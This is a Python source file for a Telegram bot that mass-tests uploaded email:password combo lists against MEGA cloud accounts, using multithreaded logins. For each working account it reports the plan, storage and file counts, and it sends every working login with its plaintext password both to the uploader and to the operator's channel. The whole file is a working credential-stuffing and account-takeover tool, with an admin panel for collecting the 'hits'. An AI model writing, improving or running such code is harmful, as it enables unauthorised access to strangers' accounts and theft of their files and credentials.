import os
import concurrent.futures
import time
import threading
import asyncio
from queue import Queue, Empty
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)
from mega import Mega
import json
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler
from collections import Counter
import matplotlib.pyplot as plt
import io
import psutil
import platform

# ------------- CONFIG ----------------
CONFIG = {
    "TELEGRAM_BOT_TOKEN": os.getenv("TELEGRAM_BOT_TOKEN"),
    "TELEGRAM_CHANNEL_ID": os.getenv("TELEGRAM_CHANNEL_ID"),
    "ADMIN_USER_ID": int(os.getenv("ADMIN_USER_ID", 0)),
    "FILE_CAP": 5 * 1024 * 1024,  # 5 MB
    "DATA_DIR": "data",
    "RESULTS_DIR": "results",
    "QUEUE_DIR": "queue",
    "PROCESSED_DIR": "processed",
    "MAX_THREADS": 10,
    "BOT_BRAND": "💎 Powered by @VALID_EDU_MAIL | https://t.me/VALID_EDU_MAIL",
}

bot_start_time = time.time()
processing_queue = Queue()
current_processing = None
user_data = {}
processing_stats = {}
processing_lock = threading.Lock()
os.makedirs(CONFIG["DATA_DIR"], exist_ok=True)
os.makedirs(CONFIG["RESULTS_DIR"], exist_ok=True)
os.makedirs(CONFIG["QUEUE_DIR"], exist_ok=True)
os.makedirs(CONFIG["PROCESSED_DIR"], exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        RotatingFileHandler('bot.log', maxBytes=5*1024*1024, backupCount=3),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --------- FILE AND DATA HELPERS ----------
def load_user_data():
    global user_data
    data_file = os.path.join(CONFIG["DATA_DIR"], "user.json")
    if os.path.exists(data_file):
        try:
            with open(data_file, "r") as f:
                user_data.update(json.load(f))
        except Exception as e:
            logger.error(f"Failed to load user data: {str(e)}")
            user_data["users"] = {}
    else:
        user_data["users"] = {}

def save_user_data():
    data_file = os.path.join(CONFIG["DATA_DIR"], "user.json")
    try:
        with open(data_file, "w") as f:
            json.dump(user_data, f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save user data: {str(e)}")

def user_stat_inc(user_id, key, incr=1):
    ud = user_data["users"].setdefault(str(user_id), {
        "total_checked": 0,
        "total_valid": 0,
        "total_files": 0,
        "account_types": {},
        "join_date": int(time.time()),
        "last_used": int(time.time()),
        "first_name": "",
        "username": ""
    })
    ud[key] = ud.get(key, 0) + incr
    ud["last_used"] = int(time.time())
    save_user_data()

def user_stat_set(user_id, key, val):
    ud = user_data["users"].setdefault(str(user_id), {
        "total_checked": 0,
        "total_valid": 0,
        "total_files": 0,
        "account_types": {},
        "join_date": int(time.time()),
        "last_used": int(time.time()),
        "first_name": "",
        "username": ""
    })
    ud[key] = val
    ud["last_used"] = int(time.time())
    save_user_data()

def get_account_type_name(tp):
    return {0:"Free", 1:"Pro Lite", 2:"Pro I", 3:"Pro II", 4:"Pro III", 100:"Business"}.get(tp, "Unknown")

def get_file_folder_count(file_tree):
    files = sum(1 for f in file_tree.values() if f['t'] == 0)
    folders = sum(1 for f in file_tree.values() if f['t'] == 1)
    return files, folders

# --------- MEGA CHECKER -----------
def check_mega_account(email, password):
    try:
        mega = Mega()
        account = mega.login(email, password)
        info = account.get_user()
        acc_type = get_account_type_name(info.get('accountType', 0))
        storage_info = account.get_storage_space()
        used = storage_info['used'] / (1024 ** 3)
        total = storage_info['total'] / (1024 ** 3)
        file_tree = account.get_files()
        files, folders = get_file_folder_count(file_tree)
        return {
            "valid": True,
            "used": used,
            "total": total,
            "plan": acc_type,
            "files": files,
            "folders": folders,
            "error": None
        }
    except Exception as e:
        return {
            "valid": False,
            "error": str(e)
        }

# --------- QUEUE PROCESSOR -----------
def process_queue():
    global current_processing
    while True:
        try:
            with processing_lock:
                if not processing_queue.empty() and current_processing is None:
                    current_processing = processing_queue.get_nowait()
                    user_id = current_processing[0]
                    processing_stats[user_id] = {"total": 0, "valid": 0, "invalid": 0}
            if current_processing:
                user_id, file_path, context = current_processing
                try:
                    process_user_file(user_id, file_path, context)
                except Exception as e:
                    logger.error(f"Error processing file for user {user_id}: {str(e)}")
                    try:
                        asyncio.run_coroutine_threadsafe(
                            context.bot.send_message(chat_id=user_id, text="😵 Oops, something broke! Try again."),
                            asyncio.get_event_loop()
                        )
                    except Exception:
                        pass
                with processing_lock:
                    if user_id in processing_stats:
                        del processing_stats[user_id]
                    current_processing = None
                time.sleep(5)
            time.sleep(1)
        except Empty:
            time.sleep(1)
        except Exception as e:
            logger.error(f"Queue processing error: {str(e)}")

def process_user_file(user_id, file_path, context):
    valid_file = os.path.join(CONFIG["RESULTS_DIR"], f"valid_{user_id}.txt")
    invalid_file = os.path.join(CONFIG["RESULTS_DIR"], f"invalid_{user_id}.txt")
    if os.path.exists(valid_file): os.remove(valid_file)
    if os.path.exists(invalid_file): os.remove(invalid_file)
    valid_accounts, domains, storages = [], [], []
    with open(file_path, "r", encoding="utf-8") as f:
        credentials = [line.strip() for line in f if ':' in line and line.count(':') == 1]
    total = len(credentials)
    if not total:
        asyncio.run_coroutine_threadsafe(
            context.bot.send_message(chat_id=user_id, text="🙈 Your file is empty or not in mail:pass format."),
            asyncio.get_event_loop()
        )
        return
    with processing_lock:
        processing_stats[user_id]["total"] = total
    user_stat_inc(user_id, "total_files")
    hit_lines = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["MAX_THREADS"]) as executor:
        futures = {executor.submit(check_mega_account, *line.split(':',1)): line for line in credentials}
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            line = futures[future]
            email, pwd = line.split(':', 1)
            result = future.result()
            if result["valid"]:
                domains.append(email.split('@')[-1].lower())
                storages.append(result["used"])
                msg = (f"✅ <b>Valid Account:</b> <code>{email}</code>\n"
                       f"🔑 {pwd}\n"
                       f"💼 Plan: {result['plan']}\n"
                       f"📁 Files: {result['files']} | Folders: {result['folders']}\n"
                       f"💾 Storage: {result['used']:.2f}GB / {result['total']:.2f}GB")
                combo_str = (f"Account: {email}:{pwd}\n[Plan: {result['plan']}] "
                             f"[{result['used']:.2f}GB/{result['total']:.2f}GB] "
                             f"[Files: {result['files']}, Folders: {result['folders']}]\n")
                FileManager.safe_write(valid_file, combo_str)
                hit_lines.append(combo_str)
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML"),
                    asyncio.get_event_loop()
                )
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_message(chat_id=CONFIG["TELEGRAM_CHANNEL_ID"], text=msg, parse_mode="HTML"),
                    asyncio.get_event_loop()
                )
                valid_accounts.append((email, pwd, result['plan'], result['used'], result['total']))
                user_stat_inc(user_id, "total_valid")
                ud = user_data["users"].setdefault(str(user_id), {})
                account_types = ud.get("account_types", {})
                account_types[result["plan"]] = account_types.get(result["plan"], 0) + 1
                user_stat_set(user_id, "account_types", account_types)
            else:
                FileManager.safe_write(invalid_file, f"{line} | Error: {result['error']}")
            with processing_lock:
                processing_stats[user_id]["valid"] += int(result["valid"])
                processing_stats[user_id]["invalid"] += int(not result["valid"])
                stats = processing_stats.get(user_id, {})
            if (i+1) % max(1,total//10) == 0 or (i+1) == total:
                progress = int((stats["valid"] + stats["invalid"])/stats["total"]*100)
                bar = '█'*int(20*progress/100)+'-'*(20-int(20*progress/100))
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_message(chat_id=user_id, text=f"⏳ Progress: {progress}% [{bar}]\n✅ {stats['valid']} | ❌ {stats['invalid']}"),
                    asyncio.get_event_loop()
                )
    domain_counts = Counter(domains)
    msg = (f"🏁 Done!\nTotal checked: {total}\n"
           f"✅ Valid: {stats['valid']} ({stats['valid']/total*100:.2f}%)\n"
           f"❌ Invalid: {stats['invalid']}\n"
           f"🌍 Domains: " + ", ".join(f"{d}: {n}" for d,n in domain_counts.items()) + "\n"
           f"📊 Avg storage: {sum(storages)/len(storages):.2f}GB" if storages else "")
    asyncio.run_coroutine_threadsafe(
        context.bot.send_message(chat_id=user_id, text=msg),
        asyncio.get_event_loop()
    )
    if domains:
        plt.figure(figsize=(5,5))
        plt.pie(domain_counts.values(), labels=domain_counts.keys(), autopct='%1.1f%%')
        plt.title("Domain Distribution")
        buf = io.BytesIO()
        plt.savefig(buf, format='png'); buf.seek(0)
        asyncio.run_coroutine_threadsafe(
            context.bot.send_photo(chat_id=user_id, photo=buf, caption="📊 Domain breakdown!"),
            asyncio.get_event_loop()
        )
        buf.close()
    FileManager.safe_write(valid_file, "\n"+CONFIG["BOT_BRAND"])
    if os.path.exists(valid_file) and os.path.getsize(valid_file)>0:
        with open(valid_file, "rb") as f:
            asyncio.run_coroutine_threadsafe(
                context.bot.send_document(chat_id=user_id, document=f, caption="✅ Your valid accounts!"),
                asyncio.get_event_loop()
            )
        with open(valid_file, "rb") as f:
            asyncio.run_coroutine_threadsafe(
                context.bot.send_document(chat_id=CONFIG["TELEGRAM_CHANNEL_ID"], document=f, caption="New hits!"),
                asyncio.get_event_loop()
            )
        os.remove(valid_file)
    if os.path.exists(invalid_file) and os.path.getsize(invalid_file)>0:
        with open(invalid_file, "rb") as f:
            asyncio.run_coroutine_threadsafe(
                context.bot.send_document(chat_id=user_id, document=f, caption="❌ Invalid accounts."),
                asyncio.get_event_loop()
            )
        os.remove(invalid_file)
    user_stat_inc(user_id, "total_checked", total)
    user_stat_set(user_id, "last_combo", int(time.time()))
    try:
        os.rename(file_path, os.path.join(CONFIG["PROCESSED_DIR"], os.path.basename(file_path)))
    except:
        pass

class FileManager:
    @staticmethod
    def safe_write(filepath, content, mode='a'):
        try:
            with open(filepath, mode, encoding='utf-8') as f:
                f.write(content + '\n')
            return True
        except IOError as e:
            logger.error(f"Failed to write to {filepath}: {str(e)}")
            return False

# ----------- BOT COMMANDS -----------
def check_admin(uid):
    return int(uid) == int(CONFIG["ADMIN_USER_ID"])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "Unknown"
    if user_id not in user_data["users"]:
        user_data["users"][user_id] = {
            "total_checked": 0,
            "total_valid": 0,
            "total_files": 0,
            "account_types": {},
            "join_date": int(time.time()),
            "last_used": int(time.time()),
            "first_name": first_name,
            "username": username
        }
        save_user_data()
    await update.message.reply_text(
        f"👋 Hi {first_name}!\n"
        "Drop a .txt file with <code>mail:pass</code> per line to check accounts.\n"
        f"📁 Max file size: 5 MB. No limits. Totally free!\n"
        "Use /status to check your job, /help for commands.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💎 Our Channel", url="https://t.me/YourChannel")]
        ])
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "<b>Account Checker Bot Help</b>\n\n"
        "• Upload a .txt file with <code>mail:pass</code> on each line.\n"
        "• Bot checks for valid accounts and notifies you.\n"
        "• Progress updates every 10%.\n"
        "• Get results & domain stats.\n"
        "• Max file size: 5 MB. No daily limits!\n"
        "• /status — See your progress.\n"
        "• /my_stats — Your stats.\n"
        "• /admin — [Admin] Panel.\n"
        "• Admin: full access to all commands."
    )
    await update.message.reply_text(msg, parse_mode="HTML")

async def my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    stats = user_data["users"].get(user_id, {})
    msg = (
        f"Your stats:\n"
        f"Combos checked: {stats.get('total_checked', 0)}\n"
        f"Valid accounts: {stats.get('total_valid', 0)}\n"
        f"Last combo: {datetime.utcfromtimestamp(stats.get('last_combo',0)).strftime('%Y-%m-%d %H:%M') if stats.get('last_combo') else 'N/A'}"
    )
    await update.message.reply_text(msg)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    with processing_lock:
        if current_processing and current_processing[0] == user_id:
            stats = processing_stats.get(user_id, {})
            if stats:
                progress = int((stats["valid"] + stats["invalid"]) / stats["total"] * 100)
                bar = '█'*int(20*progress/100)+'-'*(20-int(20*progress/100))
                await update.message.reply_text(
                    f"⚙️ Your file is being processed!\n"
                    f"Progress: {progress}% [{bar}]\n"
                    f"✅ Valid: {stats['valid']}\n"
                    f"❌ Invalid: {stats['invalid']}\n"
                )
                return
        queue_size = processing_queue.qsize()
        if current_processing: queue_size += 1
    in_queue = False
    with processing_lock:
        for item in list(processing_queue.queue):
            if item[0] == user_id:
                in_queue = True
                break
    if in_queue:
        await update.message.reply_text(f"⏳ Your file is in the queue!\nQueue Position: {queue_size}")
    else:
        await update.message.reply_text("🛌 Nothing in progress for you. Upload a file to start checking!")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    doc = update.message.document
    if not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text("Please upload a .txt file (mail:pass per line).")
        return
    if doc.file_size > CONFIG["FILE_CAP"]:
        await update.message.reply_text("❌ File is too big! Max 5 MB per upload.")
        return
    file = await context.bot.get_file(doc.file_id)
    unique_timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    file_path = os.path.join(CONFIG["QUEUE_DIR"], f"combo_{user_id}_{unique_timestamp}.txt")
    await file.download_to_drive(file_path)
    valid_lines = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            if ':' in line and line.count(':') == 1: valid_lines.append(line.strip())
    if not valid_lines:
        await update.message.reply_text("No valid mail:pass lines found.")
        os.remove(file_path)
        return
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(valid_lines) + "\n")
    with processing_lock:
        processing_queue.put((user_id, file_path, context))
    queue_position = processing_queue.qsize()
    if current_processing: queue_position += 1
    await update.message.reply_text(
        f"📥 File received!\nQueue Position: {queue_position}\nValid Lines: {len(valid_lines)}\nProcessing will start soon.\nUse /status to check progress."
    )

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_admin(update.effective_user.id):
        await update.message.reply_text("Admin only.")
        return
    keyboard = [
        [InlineKeyboardButton("Live Stats", callback_data='admin_stats')],
        [InlineKeyboardButton("Download User DB", callback_data='admin_userdb')],
        [InlineKeyboardButton("Queue Status", callback_data='admin_queue')],
        [InlineKeyboardButton("Download Hits", callback_data='admin_hits')],
        [InlineKeyboardButton("Bot Uptime", callback_data='admin_status')],
        [InlineKeyboardButton("Broadcast", callback_data='admin_broadcast')],
        [InlineKeyboardButton("User Data Backup", callback_data='admin_backup')],
    ]
    await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    data = query.data
    await query.answer()
    if not check_admin(user_id):
        await query.message.reply_text("Admin only.")
        return
    if data == 'admin_stats':
        stats = sorted(((u, d.get('total_valid',0)) for u,d in user_data["users"].items()), key=lambda x:x[1], reverse=True)
        msg = f"👑 Top 10 Users by Valid:\n"
        for u, v in stats[:10]:
            name = user_data["users"][u].get("first_name","user")
            msg += f"{name} ({u}): {v} valid\n"
        await query.message.reply_text(msg)
    elif data == 'admin_userdb':
        db_path = os.path.join(CONFIG["DATA_DIR"], "user.json")
        with open(db_path, "rb") as f:
            await context.bot.send_document(chat_id=user_id, document=f, caption="User DB")
    elif data == 'admin_queue':
        with processing_lock:
            qlist = list(processing_queue.queue)
        msg = f"Queue size: {len(qlist)}\n"
        for i, item in enumerate(qlist):
            msg += f"{i+1}. User {item[0]} | File: {os.path.basename(item[1])}\n"
        await query.message.reply_text(msg)
    elif data == 'admin_hits':
        hits = []
        for fname in os.listdir(CONFIG["RESULTS_DIR"]):
            if fname.startswith("valid_"):
                with open(os.path.join(CONFIG["RESULTS_DIR"], fname), "r", encoding="utf-8") as f:
                    hits.extend(f.readlines())
        if hits:
            hit_path = os.path.join(CONFIG["RESULTS_DIR"], "all_hits.txt")
            with open(hit_path, "w", encoding="utf-8") as f:
                f.writelines(hits)
            with open(hit_path, "rb") as f:
                await context.bot.send_document(chat_id=user_id, document=f, caption="All hits")
            os.remove(hit_path)
        else:
            await query.message.reply_text("No hits yet.")
    elif data == 'admin_status':
        uptime = int(time.time() - bot_start_time)
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        msg = (
            f"🛠 Bot Uptime: {uptime//3600}h{(uptime%3600)//60}m\n"
            f"CPU: {cpu}% RAM: {ram}%\n"
            f"OS: {platform.system()} {platform.release()}\n"
            f"Queue: {processing_queue.qsize()}\n"
        )
        await query.message.reply_text(msg)
    elif data == 'admin_broadcast':
        await query.message.reply_text("Reply to this message with your broadcast text.")
        context.user_data['await_broadcast'] = True
    elif data == 'admin_backup':
        report_path = os.path.join(CONFIG["DATA_DIR"], f"user_data_backup_{int(time.time())}.txt")
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("User Data Backup\n")
            f.write(f"Generated at: {datetime.utcfromtimestamp(int(time.time())).strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n")
            for user_id, data in user_data["users"].items():
                f.write(f"User ID: {user_id}\n")
                f.write(f"Username: {data.get('username', 'N/A')}\n")
                f.write(f"First Name: {data.get('first_name', 'Unknown')}\n")
                f.write(f"Join Date: {datetime.utcfromtimestamp(data.get('join_date', 0)).strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Last Used: {datetime.utcfromtimestamp(data.get('last_used', 0)).strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Files: {data.get('total_files', 0)}\n")
                f.write(f"Total Checked: {data.get('total_checked', 0)}\n")
                f.write(f"Total Valid: {data.get('total_valid', 0)}\n")
                f.write("Account Types:\n")
                for acc_type, count in data.get("account_types", {}).items():
                    f.write(f"  {acc_type}: {count}\n")
                f.write("\n")
        with open(report_path, "rb") as f:
            await context.bot.send_document(
                chat_id=CONFIG["TELEGRAM_CHANNEL_ID"],
                document=f,
                caption="📊 Manual User Data Backup"
            )
        os.remove(report_path)

async def admin_broadcast_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_admin(update.effective_user.id): return
    if context.user_data.get('await_broadcast'):
        msg = update.message.text
        for uid in user_data["users"]:
            try:
                await context.bot.send_message(chat_id=uid, text=f"📢 ADMIN BROADCAST:\n{msg}")
            except:
                pass
        await update.message.reply_text("Broadcast sent to all users.")
        context.user_data['await_broadcast'] = False

# --------- HOURLY BACKUP -----------
def hourly_backup(bot):
    while True:
        try:
            report_path = os.path.join(CONFIG["DATA_DIR"], f"user_data_backup_{int(time.time())}.txt")
            with open(report_path, "w", encoding="utf-8") as f:
                f.write("User Data Backup\n")
                f.write(f"Generated at: {datetime.utcfromtimestamp(int(time.time())).strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n")
                for user_id, data in user_data["users"].items():
                    f.write(f"User ID: {user_id}\n")
                    f.write(f"Username: {data.get('username', 'N/A')}\n")
                    f.write(f"First Name: {data.get('first_name', 'Unknown')}\n")
                    f.write(f"Join Date: {datetime.utcfromtimestamp(data.get('join_date', 0)).strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Last Used: {datetime.utcfromtimestamp(data.get('last_used', 0)).strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total Files: {data.get('total_files', 0)}\n")
                    f.write(f"Total Checked: {data.get('total_checked', 0)}\n")
                    f.write(f"Total Valid: {data.get('total_valid', 0)}\n")
                    f.write("Account Types:\n")
                    for acc_type, count in data.get("account_types", {}).items():
                        f.write(f"  {acc_type}: {count}\n")
                    f.write("\n")
            with open(report_path, "rb") as f:
                asyncio.run_coroutine_threadsafe(
                    bot.send_document(
                        chat_id=CONFIG["TELEGRAM_CHANNEL_ID"],
                        document=f,
                        caption="📊 Hourly User Data Backup"
                    ),
                    asyncio.get_event_loop()
                )
            os.remove(report_path)
        except Exception as e:
            logger.error(f"Failed to send hourly backup: {str(e)}")
        time.sleep(3600)

# --------- MAIN -----------
def main():
    load_user_data()
    threading.Thread(target=process_queue, daemon=True).start()
    application = ApplicationBuilder().token(CONFIG["TELEGRAM_BOT_TOKEN"]).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("my_stats", my_stats))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(admin_button))
    application.add_handler(MessageHandler(filters.TEXT & filters.REPLY, admin_broadcast_reply))
    threading.Thread(target=hourly_backup, args=(application.bot,), daemon=True).start()
    logger.info("✅ Bot is live!")
    application.run_polling()

if __name__ == "__main__":
    main()
